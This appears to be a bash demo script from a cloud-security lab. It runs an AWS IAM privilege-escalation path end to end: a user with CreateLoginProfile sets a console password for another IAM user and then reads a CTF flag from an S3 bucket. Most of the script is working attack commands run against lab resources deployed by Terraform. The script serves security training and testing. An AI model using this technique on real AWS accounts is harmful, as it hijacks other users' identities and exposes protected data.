#!/bin/bash

# Demo script for iam:CreateLoginProfile privilege escalation to S3 bucket access
# This script demonstrates how a user with CreateLoginProfile permission can escalate to S3 bucket access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-004-bucket-starting-user"
HOP1_USER="pl-prod-iam-004-bucket-hop1"

# Generate a random password suffix (8 characters)
RANDOM_SUFFIX=$(openssl rand -hex 4)
PASSWORD="PathfindingLabs123!${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateLoginProfile to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Extract credentials from Terraform outputs
echo -e "${YELLOW}Step 1: Extracting credentials from Terraform outputs${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_iam_004_iam_createloginprofile.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract target bucket name from module output
TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.sensitive_bucket_name')

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved credentials${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

echo -e "${GREEN}✓ Successfully extracted and configured credentials${NC}\n"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Current identity: $CURRENT_USER"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION] Step 4: Identify target bucket
echo -e "${YELLOW}Step 4: Identifying target bucket${NC}"
echo "Target bucket: $TARGET_BUCKET"
echo -e "${GREEN}✓ Identified target bucket from Terraform output${NC}\n"

# [EXPLOIT] Step 5: Check if hop1 user already has a login profile
echo -e "${YELLOW}Step 5: Checking if hop1 user has a login profile${NC}"
echo "Checking for existing login profile for user: $HOP1_USER"
use_starting_creds
show_cmd "Attacker" "aws iam get-login-profile --user-name $HOP1_USER"
if aws iam get-login-profile --user-name $HOP1_USER &> /dev/null; then
    echo -e "${RED}⚠ Login profile already exists for $HOP1_USER${NC}"
    echo "Please run ./cleanup_attack.sh first to remove the existing login profile"
    exit 1
else
    echo -e "${GREEN}✓ Confirmed: No login profile exists (ready for attack)${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Verify we don't have S3 bucket access yet
echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
echo "Target bucket: $TARGET_BUCKET"
echo "Attempting to list bucket contents (should fail)..."

show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET"
if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 7: Create login profile for hop1 user
echo -e "${YELLOW}Step 7: Creating login profile for hop1 user${NC}"
echo "Creating console password for user: $HOP1_USER"
echo "Password: $PASSWORD"

show_attack_cmd "Attacker" "aws iam create-login-profile --user-name $HOP1_USER --password \"$PASSWORD\" --no-password-reset-required"
aws iam create-login-profile \
    --user-name $HOP1_USER \
    --password "$PASSWORD" \
    --no-password-reset-required

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created login profile!${NC}"
else
    echo -e "${RED}Failed to create login profile${NC}"
    exit 1
fi
echo ""

# Wait for IAM propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
sleep 15
echo ""

# [OBSERVATION] Step 8: Confirm login profile creation
echo -e "${YELLOW}Step 8: Confirming login profile creation${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws iam get-login-profile --user-name $HOP1_USER --query 'LoginProfile.UserName' --output text"
PROFILE_USER=$(aws iam get-login-profile --user-name $HOP1_USER --query 'LoginProfile.UserName' --output text 2>/dev/null)
if [ "$PROFILE_USER" == "$HOP1_USER" ]; then
    echo -e "${GREEN}✓ Confirmed login profile created for $HOP1_USER${NC}"
else
    echo -e "${RED}✗ Could not confirm login profile creation${NC}"
fi
echo "The hop1 user can now log in via the AWS Console."
echo -e "${GREEN}✓ Login profile confirmed!${NC}\n"

# [OBSERVATION] Step 9: Read the CTF flag from the target bucket
echo -e "${YELLOW}Step 9: Reading CTF flag from the target bucket${NC}"
echo "Accessing s3://$TARGET_BUCKET/flag.txt as the hop1 user (via readonly simulation)"
use_readonly_creds
show_cmd "ReadOnly" "aws s3 cp s3://$TARGET_BUCKET/flag.txt -"
FLAG_VALUE=$(aws s3 cp s3://$TARGET_BUCKET/flag.txt - 2>/dev/null)
if [ -n "$FLAG_VALUE" ]; then
    echo -e "${GREEN}✓ CTF Flag captured:${NC} $FLAG_VALUE"
else
    echo -e "${RED}✗ Could not read flag.txt from bucket${NC}"
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Used ${YELLOW}iam:CreateLoginProfile${NC} to create console password for $HOP1_USER"
echo -e "Step 2: Gained ${YELLOW}S3 Bucket Access${NC} (console login)"
echo -e "Step 3: Read ${YELLOW}flag.txt${NC} from target bucket"
echo -e "Result: ${GREEN}S3 Bucket Access + CTF Flag${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (CreateLoginProfile) → $HOP1_USER → Console Login → S3 Bucket ($TARGET_BUCKET) → flag.txt (CTF flag)"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi
echo ""

echo -e "${GREEN}Console Login Information:${NC}"
CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
echo -e "  URL: ${YELLOW}$CONSOLE_URL${NC}"
echo -e "  Username: ${YELLOW}$HOP1_USER${NC}"
echo -e "  Password: ${YELLOW}$PASSWORD${NC}"
echo ""

if [ -n "$FLAG_VALUE" ]; then
    echo -e "${GREEN}CTF Flag:${NC} ${YELLOW}$FLAG_VALUE${NC}"
    echo ""
fi

echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the login profile${NC}"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
